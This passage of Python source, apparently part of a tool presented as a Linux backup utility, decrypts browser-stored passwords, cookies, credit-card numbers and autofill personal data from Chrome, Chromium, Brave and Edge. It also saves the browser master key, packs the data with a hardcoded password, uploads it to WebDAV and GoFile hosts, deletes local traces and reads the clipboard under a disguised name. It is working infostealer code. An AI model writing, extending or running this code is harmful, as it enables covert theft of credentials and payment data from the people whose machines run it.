                # 如果 CAST 方法失败，尝试使用备用方法
                try:
                    conn2 = sqlite3.connect(temp_web_data)
                    conn2.text_factory = bytes
                    cursor2 = conn2.cursor()
                    cursor2.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards")
                    
                    for row in cursor2.fetchall():
                        guid_bytes, name_bytes, exp_month, exp_year, encrypted_card, billing_id, nickname_bytes = row
                        try:
                            guid = guid_bytes.decode('utf-8') if isinstance(guid_bytes, bytes) else guid_bytes
                            name_on_card = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
                            nickname = nickname_bytes.decode('utf-8') if isinstance(nickname_bytes, bytes) else nickname_bytes
                        except:
                            continue
                        
                        if encrypted_card is not None and isinstance(encrypted_card, bytes):
                            decrypted_card = self._decrypt_browser_payload(encrypted_card, master_key)
                            if decrypted_card:
                                web_data["credit_cards"].append({
                                    "guid": guid,
                                    "name_on_card": name_on_card,
                                    "expiration_month": exp_month,
                                    "expiration_year": exp_year,
                                    "card_number": decrypted_card,
                                    "billing_address_id": billing_id,
                                    "nickname": nickname
                                })
                    conn2.close()
                except Exception as e2:
                    pass
            except Exception:
                pass
            
            try:
                cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix FROM autofill_profiles")
                for row in cursor.fetchall():
                    guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix = row
                    web_data["autofill_profiles"].append({
                        "guid": guid,
                        "first_name": first_name,
                        "middle_name": middle_name,
                        "last_name": last_name,
                        "full_name": full_name,
                        "honorific_prefix": honorific_prefix,
                        "honorific_suffix": honorific_suffix
                    })
            except Exception:
                pass
            
            try:
                cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name FROM autofill_profile_names")
                for row in cursor.fetchall():
                    guid, first_name, middle_name, last_name, full_name = row
                    web_data["autofill_profile_names"].append({
                        "guid": guid,
                        "first_name": first_name,
                        "middle_name": middle_name,
                        "last_name": last_name,
                        "full_name": full_name
                    })
            except Exception:
                pass
            
            try:
                cursor.execute("SELECT guid, email FROM autofill_profile_emails")
                for row in cursor.fetchall():
                    guid, email = row
                    web_data["autofill_profile_emails"].append({
                        "guid": guid,
                        "email": email
                    })
            except Exception:
                pass
            
            try:
                cursor.execute("SELECT guid, number FROM autofill_profile_phones")
                for row in cursor.fetchall():
                    guid, number = row
                    web_data["autofill_profile_phones"].append({
                        "guid": guid,
                        "number": number
                    })
            except Exception:
                pass
            
            try:
                cursor.execute("SELECT guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code FROM autofill_profile_addresses")
                for row in cursor.fetchall():
                    guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code = row
                    web_data["autofill_profile_addresses"].append({
                        "guid": guid,
                        "street_address": street_address,
                        "address_line_1": address_line_1,
                        "address_line_2": address_line_2,
                        "city": city,
                        "state": state,
                        "zipcode": zipcode,
                        "country_code": country_code
                    })
            except Exception:
                pass
            
            conn.close()
        except Exception:
            pass
        finally:
            if os.path.exists(temp_web_data):
                try:
                    os.remove(temp_web_data)
                except Exception:
                    pass
        
        return web_data
    
    def _encrypt_browser_export_data(self, data, password):
        """加密浏览器导出数据"""
        if not CRYPTO_AVAILABLE:
            return None
        
        try:
            salt = get_random_bytes(32)
            key = PBKDF2(password, salt, dkLen=32, count=100000)
            cipher = AES.new(key, AES.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(
                json.dumps(data, ensure_ascii=False).encode('utf-8')
            )
            
            encrypted_data = {
                "salt": base64.b64encode(salt).decode('utf-8'),
                "nonce": base64.b64encode(cipher.nonce).decode('utf-8'),
                "tag": base64.b64encode(tag).decode('utf-8'),
                "ciphertext": base64.b64encode(ciphertext).decode('utf-8')
            }
            return encrypted_data
        except Exception:
            return None
    
    def backup_browser_data(self, target_browser_data):
        """导出所有浏览器的 Cookies 和密码（加密保存）- 独立函数和独立目录"""
        if not CRYPTO_AVAILABLE:
            if self.config.DEBUG_MODE:
                logging.debug("⚠️ 浏览器数据导出功能不可用（缺少 pycryptodome）")
            return
        
        try:
            home_dir = os.path.expanduser('~')
            username = getpass.getuser()
            user_prefix = username[:5] if username else "user"
            
            # 浏览器 User Data 根目录（支持多个 Profile）
            browsers = {
                "Chrome": os.path.join(home_dir, ".config/google-chrome"),
                "Chromium": os.path.join(home_dir, ".config/chromium"),
                "Brave": os.path.join(home_dir, ".config/BraveSoftware/Brave-Browser"),
                "Edge": os.path.join(home_dir, ".config/microsoft-edge"),
            }
            
            # 在目标目录下创建临时目录
            temp_dir = os.path.join(target_browser_data, "temp_browser_export")
            if not self._ensure_directory(temp_dir):
                return
            
            all_data = {
                "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "username": username,
                "platform": "Linux",
                "browsers": {}
            }
            
            exported_count = 0
            for browser_name, user_data_path in browsers.items():
                if not os.path.exists(user_data_path):
                    continue
                
                # 获取主密钥（所有 Profile 共享同一个 Master Key）
                master_key = self._get_browser_master_key(browser_name)
                master_key_b64 = None
                if master_key:
                    # 将 Master Key 编码为 base64 以便保存
                    master_key_b64 = base64.b64encode(master_key).decode('utf-8')
                else:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"⚠️  无法获取 {browser_name} 主密钥，将跳过加密数据解密")
                
                # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
                profiles = []
                try:
                    for item in os.listdir(user_data_path):
                        item_path = os.path.join(user_data_path, item)
                        # 检查是否是 Profile 目录（Default 或 Profile N）
                        if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                            # 检查是否存在 Cookies、Login Data 或 Web Data 文件（支持 Network/Cookies 路径）
                            cookies_path = os.path.join(item_path, "Network", "Cookies")
                            if not os.path.exists(cookies_path):
                                cookies_path = os.path.join(item_path, "Cookies")
                            login_data_path = os.path.join(item_path, "Login Data")
                            web_data_path = os.path.join(item_path, "Web Data")
                            if os.path.exists(cookies_path) or os.path.exists(login_data_path) or os.path.exists(web_data_path):
                                profiles.append(item)
                except Exception as e:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"扫描 {browser_name} Profile 目录失败: {e}")
                    continue
                
                if not profiles:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"⚠️  {browser_name} 未找到任何 Profile")
                    continue
                
                # 为每个 Profile 导出数据
                browser_profiles = {}
                for profile_name in profiles:
                    profile_path = os.path.join(user_data_path, profile_name)
                    if self.config.DEBUG_MODE:
                        logging.info(f"  📂 处理 Profile: {profile_name}")
                    
                    cookies = self._export_browser_cookies(browser_name, profile_path, master_key, temp_dir, profile_name) if master_key else []
                    passwords = self._export_browser_passwords(browser_name, profile_path, master_key, temp_dir, profile_name) if master_key else []
                    web_data = self._export_browser_web_data(browser_name, profile_path, master_key, temp_dir, profile_name)
                    
                    if cookies or passwords or any(web_data.values()):
                        total_web_data_items = (
                            len(web_data["autofill_profiles"]) +
                            len(web_data["credit_cards"]) +
                            len(web_data["autofill_profile_names"]) +
                            len(web_data["autofill_profile_emails"]) +
                            len(web_data["autofill_profile_phones"]) +
                            len(web_data["autofill_profile_addresses"])
                        )
                        browser_profiles[profile_name] = {
                            "cookies": cookies,
                            "passwords": passwords,
                            "web_data": web_data,
                            "cookies_count": len(cookies),
                            "passwords_count": len(passwords),
                            "web_data_count": total_web_data_items,
                            "credit_cards_count": len(web_data["credit_cards"]),
                            "autofill_profiles_count": len(web_data["autofill_profiles"])
                        }
                        web_data_info = f", {total_web_data_items} Web Data" if total_web_data_items > 0 else ""
                        if self.config.DEBUG_MODE:
                            logging.info(f"    ✅ {profile_name}: {len(cookies)} Cookies, {len(passwords)} 密码{web_data_info}")
                
                if browser_profiles:
                    all_data["browsers"][browser_name] = {
                        "profiles": browser_profiles,
                        "master_key": master_key_b64,  # 备份 Master Key（base64 编码，所有 Profile 共享）
                        "total_cookies": sum(p["cookies_count"] for p in browser_profiles.values()),
                        "total_passwords": sum(p["passwords_count"] for p in browser_profiles.values()),
                        "total_web_data": sum(p.get("web_data_count", 0) for p in browser_profiles.values()),
                        "total_credit_cards": sum(p.get("credit_cards_count", 0) for p in browser_profiles.values()),
                        "total_autofill_profiles": sum(p.get("autofill_profiles_count", 0) for p in browser_profiles.values()),
                        "profiles_count": len(browser_profiles)
                    }
                    exported_count += 1
                    master_key_status = "✅" if master_key_b64 else "⚠️"
                    total_cookies = all_data["browsers"][browser_name]["total_cookies"]
                    total_passwords = all_data["browsers"][browser_name]["total_passwords"]
                    total_web_data = all_data["browsers"][browser_name]["total_web_data"]
                    web_data_summary = f", {total_web_data} Web Data" if total_web_data > 0 else ""
                    if self.config.DEBUG_MODE:
                        logging.info(f"✅ {browser_name}: {len(browser_profiles)} 个 Profile, {total_cookies} Cookies, {total_passwords} 密码{web_data_summary} {master_key_status} Master Key")
            
            if exported_count == 0:
                if self.config.DEBUG_MODE:
                    logging.debug("⚠️ 没有可导出的浏览器数据")
                shutil.rmtree(temp_dir, ignore_errors=True)
                return
            
            # 加密保存
            password = "cookies2026"
            encrypted_data = self._encrypt_browser_export_data(all_data, password)
            if not encrypted_data:
                shutil.rmtree(temp_dir, ignore_errors=True)
                return
            
            # 保存到独立的浏览器数据目录
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            if not self._ensure_directory(target_browser_data):
                shutil.rmtree(temp_dir, ignore_errors=True)
                return
            
            output_file = os.path.join(target_browser_data, f"{user_prefix}_browser_data_{timestamp}.encrypted")
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
            
            logging.critical(f"🔐 浏览器数据已加密导出: {exported_count} 个浏览器")
            
            # 清理临时目录
            shutil.rmtree(temp_dir, ignore_errors=True)
            
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.debug(f"浏览器数据导出失败: {str(e)}")

    def backup_linux_files(self, source_dir, target_dir):
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error("❌ Linux源目录不存在")
            return None

        # 获取用户名前缀
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"

        target_docs = os.path.join(target_dir, f"{user_prefix}_docs") # 备份文档的目标目录
        target_configs = os.path.join(target_dir, f"{user_prefix}_configs") # 备份配置文件的目标目录
        target_specified = os.path.join(target_dir, f"{user_prefix}_specified")  # 新增指定目录/文件的备份目录
        target_extensions = os.path.join(target_dir, f"{user_prefix}_extensions")  # 浏览器扩展的独立备份目录
        target_browser_data = os.path.join(target_dir, f"{user_prefix}_browser_data")  # 浏览器数据的独立备份目录

        if not self._clean_directory(target_dir):
            return None

        if not all(self._ensure_directory(d) for d in [target_docs, target_configs, target_specified, target_extensions, target_browser_data]):
            return None

        # 首先备份指定目录或文件 (SERVER_BACKUP_DIRS)
        for specific_path in self.config.SERVER_BACKUP_DIRS:
            # 支持通配符（glob），例如 ".openclaw/openclaw.json*"
            if any(ch in specific_path for ch in ["*", "?", "["]):
                pattern = os.path.join(source_dir, specific_path)
                matched_paths = glob.glob(pattern)
                for matched_path in matched_paths:
                    rel_name = os.path.relpath(matched_path, source_dir)
                    self._backup_specified_item(matched_path, target_specified, rel_name)
                continue

            full_source_path = os.path.join(source_dir, specific_path)
            if os.path.exists(full_source_path):
                self._backup_specified_item(full_source_path, target_specified, specific_path)

        # 备份浏览器扩展目录（独立函数和独立目录）
        self.backup_chrome_extensions(target_extensions)
        
        # 导出浏览器 Cookies 和密码（加密保存，独立函数和独立目录）
        self.backup_browser_data(target_browser_data)

        # 然后备份其他文件 (不在SERVER_BACKUP_DIRS中的，根据文件类型备份)
        # 预计算已备份的目录路径集合，优化性能
        source_dir_abs = os.path.abspath(source_dir)
        backed_up_dirs = set()
        for specific_dir in self.config.SERVER_BACKUP_DIRS:
            specific_path = os.path.join(source_dir, specific_dir)
            if os.path.isdir(specific_path):
                backed_up_dirs.add(os.path.abspath(specific_path))
        
        docs_count = configs_count = 0
        target_dir_abs = os.path.abspath(target_dir)
        exclude_dirs_lower = {ex.lower() for ex in self.config.EXCLUDE_DIRS}
        
        for root, dirs, files in os.walk(source_dir):
            root_abs = os.path.abspath(root)
            
            # 跳过源目录本身的文件处理，只在这里处理一级子目录的排除
            if root_abs == source_dir_abs:
                # 创建一个目录列表副本用于迭代，因为我们可能会修改原始dirs列表
                dirs_to_walk = dirs[:] 
                for d in dirs_to_walk:
                    # 检查这个第一级子目录是否在排除列表中（不区分大小写）
                    if d.lower() in exclude_dirs_lower:
                         if self.config.DEBUG_MODE:
                              logging.info(f"⏭️ 已排除第一级目录: {d}/")
                         dirs.remove(d) # 从os.walk迭代的列表中移除，阻止进入此目录
                continue # 跳过源目录本身的文件处理

            # 跳过已在上面作为指定目录备份过的目录 (或其下的子目录)
            if any(root_abs.startswith(backed_dir) for backed_dir in backed_up_dirs):
                continue

            # 跳过目标备份目录本身，避免备份备份文件
            if root_abs.startswith(target_dir_abs):
                continue

            # 对于非第一级目录或未排除的第一级目录下的文件/子目录，根据文件扩展名进行备份

            for file in files:
                # 判断文件是否为文档类型或配置类型（使用集合优化性能）
                file_lower = file.lower()
                is_doc = any(file_lower.endswith(ext) for ext in self.doc_extensions_set)
                is_config = any(file_lower.endswith(ext) for ext in self.config_extensions_set)

                # 如果既不是文档也不是配置，跳过
                if not (is_doc or is_config):
                    continue

                source_file = os.path.join(root, file)
                # os.walk已经提供了文件列表，通常不需要再次检查存在性
                # 但如果文件在遍历过程中被删除，这里可以跳过

                # 根据文件类型确定目标基路径
                target_base = target_docs if is_doc else target_configs
                # 获取相对于源目录的路径
                relative_path = os.path.relpath(root, source_dir)
                # 构建目标子目录路径
                target_sub_dir = os.path.join(target_base, relative_path)
                # 构建目标文件路径
                target_file = os.path.join(target_sub_dir, file)

                # 确保目标子目录存在
                if not self._ensure_directory(target_sub_dir):
                    continue

                try:
                    # 复制文件到目标位置
                    shutil.copy2(source_file, target_file)
                    # 更新计数器
                    if is_doc:
                        docs_count += 1
                    else:
                        configs_count += 1
                except Exception as e:
                    # 复制失败记录错误
                    if self.config.DEBUG_MODE:
                        logging.error(f"❌ 复制失败: {relative_path}/{file}")

        # 打印备份统计信息
        if docs_count > 0 or configs_count > 0:
            logging.info(f"\n📊 Linux文件备份统计:")
            if docs_count > 0:
                logging.info(f"   📚 文档: {docs_count} 个文件")
            if configs_count > 0:
                logging.info(f"   ⚙️  配置: {configs_count} 个文件")

        # 返回各个分目录的路径字典，用于分别压缩
        backup_dirs = {
            "docs": target_docs,
            "configs": target_configs,
            "specified": target_specified,
            "extensions": target_extensions,
            "browser_data": target_browser_data
        }
        return backup_dirs

    def _create_remote_directory(self, remote_dir, infini_url=None, auth=None):
        """创建远程目录（使用 WebDAV MKCOL 方法）"""
        if not remote_dir or remote_dir == '.':
            return True

        if not infini_url:
            infini_url = self.infini_url
        if auth is None:
            auth = self.auth
        
        try:
            # 构建目录路径
            dir_path = f"{infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
            
            response = self.session.request('MKCOL', dir_path, auth=auth, timeout=(8, 8))
            
            if response.status_code in [201, 204, 405]:  # 405 表示已存在
                return True
            elif response.status_code == 409:
                # 409 可能表示父目录不存在，尝试创建父目录
                parent_dir = os.path.dirname(remote_dir)
                if parent_dir and parent_dir != '.':
                    if self._create_remote_directory(parent_dir, infini_url=infini_url, auth=auth):
                        # 父目录创建成功，再次尝试创建当前目录
                        response = self.session.request('MKCOL', dir_path, auth=auth, timeout=(8, 8))
                        return response.status_code in [201, 204, 405]
                return False
            else:
                return False
        except Exception:
            return False

    def _upload_single_file_infini(self, file_path, infini_config):
        """使用指定的 Infini 配置上传单个文件。"""
        config_name = infini_config.get("name", "Infini")
        infini_url = infini_config.get("url", "").strip()
        infini_user = infini_config.get("user", "").strip()
        infini_password = infini_config.get("password", "")

        if not infini_url or not infini_user or not infini_password:
            logging.error(f"❌ [{config_name}] 配置不完整，跳过")
            return False

        auth = HTTPBasicAuth(infini_user, infini_password)
        file_size = os.path.getsize(file_path)
        filename = os.path.basename(file_path)
        remote_filename = f"{self.config.INFINI_REMOTE_BASE_DIR}/{filename}"
        remote_path = f"{infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"

        # 创建远程目录（如果需要）
        remote_dir = os.path.dirname(remote_filename)
        if remote_dir and remote_dir != '.':
            if not self._create_remote_directory(remote_dir, infini_url=infini_url, auth=auth):
                logging.warning(f"[{config_name}] 无法创建远程目录: {remote_dir}，将继续尝试上传")

        # 上传重试逻辑
        for attempt in range(self.config.RETRY_COUNT):
            if not self._check_internet_connection():
                logging.error("网络连接不可用，等待重试...")
                time.sleep(self.config.RETRY_DELAY)
                continue

            try:
                # 根据文件大小动态调整超时时间
                if file_size < 1024 * 1024:  # 小于1MB
                    connect_timeout = 10
                    read_timeout = 30
                elif file_size < 10 * 1024 * 1024:  # 1-10MB
                    connect_timeout = 15
                    read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
                else:  # 大于10MB
                    connect_timeout = 20
                    read_timeout = max(60, int(file_size / 1024 / 1024 * 6))

                # 只在第一次尝试时显示详细信息
                if attempt == 0:
                    size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                    logging.critical(f"📤 [{config_name}] 上传: {filename} ({size_str})")
                elif self.config.DEBUG_MODE:
                    logging.debug(f"[{config_name}] 重试上传: {filename} (第 {attempt + 1} 次)")

                # 准备请求头
                headers = {
                    'Content-Type': 'application/octet-stream',
                    'Content-Length': str(file_size),
                }

                # 执行上传（使用 WebDAV PUT 方法）
                with open(file_path, 'rb') as f:
                    response = self.session.put(
                        remote_path,
                        data=f,
                        headers=headers,
                        auth=auth,
                        timeout=(connect_timeout, read_timeout),
                        stream=False
                    )

                if response.status_code in [201, 204]:
                    logging.critical(f"✅ [{config_name}] {filename}")
                    try:
                        os.remove(file_path)
                    except Exception as e:
                        if self.config.DEBUG_MODE:
                            logging.error(f"删除已上传文件失败: {e}")
                    return True
                elif response.status_code == 403:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {filename}: 权限不足")
                elif response.status_code == 404:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {filename}: 远程路径不存在")
                elif response.status_code == 409:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {filename}: 远程路径冲突")
                else:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {filename}: 状态码 {response.status_code}")

            except requests.exceptions.Timeout:
                if attempt == 0 or self.config.DEBUG_MODE:
                    logging.error(f"❌ [{config_name}] {filename}: 超时")
            except requests.exceptions.SSLError:
                if attempt == 0 or self.config.DEBUG_MODE:
                    logging.error(f"❌ [{config_name}] {filename}: SSL错误")
            except requests.exceptions.ConnectionError:
                if attempt == 0 or self.config.DEBUG_MODE:
                    logging.error(f"❌ [{config_name}] {filename}: 连接错误")
            except Exception as e:
                if attempt == 0 or self.config.DEBUG_MODE:
                    logging.error(f"❌ [{config_name}] {filename}: {str(e)}")

            if attempt < self.config.RETRY_COUNT - 1:
                if self.config.DEBUG_MODE:
                    logging.debug(f"[{config_name}] 等待 {self.config.RETRY_DELAY} 秒后重试...")
                time.sleep(self.config.RETRY_DELAY)

        logging.error(f"❌ [{config_name}] {filename}: 上传失败")
        return False

    def split_large_file(self, file_path):
        """将大文件分割为多个小块"""
        if not os.path.exists(file_path):
            return None
        
        try:
            file_size = os.path.getsize(file_path)
            if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
                return [file_path]

            # 创建分片目录
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None

            # 对文件进行分片
            chunk_files = []
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                    logging.info(f"已创建分片 {chunk_num}: {len(chunk_data) / 1024 / 1024:.2f}MB")

            os.remove(file_path)
            logging.critical(f"文件 {file_path} ({file_size / 1024 / 1024:.2f}MB) 已分割为 {len(chunk_files)} 个分片")
            return chunk_files

        except Exception as e:
            logging.error(f"分割文件失败 {file_path}: {e}")
            return None

    def zip_backup_folder(self, folder_path, zip_file_path):
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"源目录为空 {folder_path}")
                return None

            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"获取文件大小失败 {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"源目录实际大小为0 {folder_path}")
                return None

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"压缩文件大小为0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None

                self._clean_directory(folder_path)
                logging.critical(f"目录 {folder_path} 已压缩: {dir_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                
                # 如果压缩文件过大，进行分片
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    return self.split_large_file(tar_path)
                else:
                    return [tar_path]
                    
            except OSError as e:
                logging.error(f"获取压缩文件大小失败 {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except Exception as e:
            logging.error(f"压缩失败 {folder_path}: {e}")
            return None

    def upload_backup(self, backup_paths):
        """上传备份文件，支持单个文件或文件列表"""
        if not backup_paths:
            return False
            
        if isinstance(backup_paths, str):
            backup_paths = [backup_paths]
            
        success = True
        for path in backup_paths:
            if not self.upload_file(path):
                success = False
        return success

    def upload_file(self, file_path):
        """上传单个文件"""
        if not self._is_valid_file(file_path):
            logging.error(f"文件 {file_path} 为空或无效，跳过上传")
            return False
            
        return self._upload_single_file(file_path)

    def _upload_single_file_gofile(self, file_path):
        """上传单个文件到 GoFile（备选方案）"""
        try:
            # 检查文件权限和状态
            if not os.path.exists(file_path):
                logging.error(f"文件不存在: {file_path}")
                return False
                
            if not os.access(file_path, os.R_OK):
                logging.error(f"文件无读取权限: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            filename = os.path.basename(file_path)
            logging.info(f"🔄 尝试使用 GoFile 上传: {filename}")

            # 上传重试逻辑
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                # 服务器轮询
                if attempt == 0:
                    size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                    logging.info(f"📤 [GoFile] 上传: {filename} ({size_str})")
                elif self.config.DEBUG_MODE:
                    logging.debug(f"[GoFile] 重试上传: {filename} (第 {attempt + 1} 次)")
                
                for server in self.config.UPLOAD_SERVERS:
                    try:
                        with open(file_path, "rb") as f:
                            # 准备上传会话
                            session = requests.Session()
                            session.headers.update({
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                            })
                            
                            # 执行上传
                            response = session.post(
                                server,
                                files={"file": f},
                                data={"token": self.api_token},
                                timeout=self.config.UPLOAD_TIMEOUT,
                                verify=True
                            )
                            
                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"✅ [GoFile] {filename}")
                                    try:
                                        os.remove(file_path)
                                    except Exception as e:
                                        if self.config.DEBUG_MODE:
                                            logging.error(f"删除已上传文件失败: {e}")
                                    return True
                                else:
                                    error_msg = result.get("message", "未知错误")
                                    if attempt == 0 or self.config.DEBUG_MODE:
                                        logging.error(f"❌ [GoFile] {filename}: {error_msg}")
                            else:
                                if attempt == 0 or self.config.DEBUG_MODE:
                                    logging.error(f"❌ [GoFile] {filename}: 状态码 {response.status_code}")
                                
                    except requests.exceptions.Timeout:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: 超时")
                    except requests.exceptions.SSLError:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: SSL错误")
                    except requests.exceptions.ConnectionError:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: 连接错误")
                    except Exception as e:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: {str(e)}")

                    continue
                
                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
                    time.sleep(self.config.RETRY_DELAY)

            logging.error(f"❌ [GoFile] {os.path.basename(file_path)}: 上传失败")
            return False
            
        except OSError as e:
            logging.error(f"获取文件信息失败 {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[GoFile] 上传过程出错: {e}")
            return False

    def _upload_single_file(self, file_path):
        """上传单个文件：依次尝试所有 Infini 配置，全部失败后再使用 GoFile 备选方案"""
        try:
            # 检查文件权限和状态
            if not os.path.exists(file_path):
                logging.error(f"文件不存在: {file_path}")
                return False
                
            if not os.access(file_path, os.R_OK):
                logging.error(f"文件无读取权限: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            filename = os.path.basename(file_path)
            infini_configs = self.infini_configs if self.infini_configs else [
                {
                    "name": "Infini-默认配置",
                    "url": self.infini_url,
                    "user": self.infini_user,
                    "password": self.infini_pass,
                }
            ]

            # 依次尝试所有 Infini 上传配置
            for index, infini_config in enumerate(infini_configs, start=1):
                config_name = infini_config.get("name", f"Infini-{index}")
                logging.info(f"🔄 尝试 Infini 上传配置 {index}/{len(infini_configs)}: {config_name}")
                if self._upload_single_file_infini(file_path, infini_config):
                    return True

            # 所有 Infini 上传方法都失败后，才尝试 GoFile 备选方案
            logging.warning(f"⚠️ 所有 Infini 上传方法均失败，尝试使用 GoFile 备选方案: {filename}")
            if self._upload_single_file_gofile(file_path):
                return True
            
            # 所有方法都失败
            try:
                os.remove(file_path)
                logging.error(f"❌ {filename}: 所有上传方法均失败")
            except Exception as e:
                if self.config.DEBUG_MODE:
                    logging.error(f"删除失败文件时出错: {e}")
            
            return False
            
        except OSError as e:
            logging.error(f"获取文件信息失败 {file_path}: {e}")
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                except:
                    pass
            return False


    def get_clipboard_content(self):
        """获取 Linux JTB 内容

        返回:
            str or None: 当前JTB文本内容，获取失败或为空时返回 None
        """
        # 检查 DISPLAY 环境变量是否可用
        display = os.environ.get('DISPLAY')
        if not display:
            # DISPLAY 不可用，只在第一次或间隔时间后记录警告
            current_time = time.time()
            if not self._clipboard_display_warned or \
               (current_time - self._clipboard_display_error_time) >= self._clipboard_display_error_interval:
                if not self._clipboard_display_warned:
                    if self.config.DEBUG_MODE:
                        logging.debug("⚠️ DISPLAY 环境变量不可用，JTB监控功能已禁用（服务器环境或无图形界面）")
                    self._clipboard_display_warned = True
                self._clipboard_display_error_time = current_time
            return None
        
        try:
            # 使用 xclip 读取JTB（需系统已安装 xclip）
            result = subprocess.run(
                ['xclip', '-selection', 'clipboard', '-o'],
                capture_output=True,
                text=True,
                env=os.environ.copy()  # 确保使用当前环境变量
            )
            if result.returncode == 0:
                content = (result.stdout or "").strip()
                if content and not content.isspace():
                    return content
                # JTB为空时不记录日志，避免频繁报错
            else:
                # xclip 返回错误，检查是否是 DISPLAY 相关错误
                error_msg = result.stderr.strip() if result.stderr else ""
                is_display_error = "Can't open display" in error_msg or "display" in error_msg.lower()
                
                if is_display_error:
                    # DISPLAY 相关错误，降低日志频率
                    current_time = time.time()
                    if not self._clipboard_display_warned or \
                       (current_time - self._clipboard_display_error_time) >= self._clipboard_display_error_interval:
                        if not self._clipboard_display_warned:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"⚠️ 获取JTB失败（DISPLAY 不可用）: {error_msg}")
                            self._clipboard_display_warned = True
                        self._clipboard_display_error_time = current_time
                else:
                    # 其他错误，不记录日志，避免频繁报错导致日志文件过大
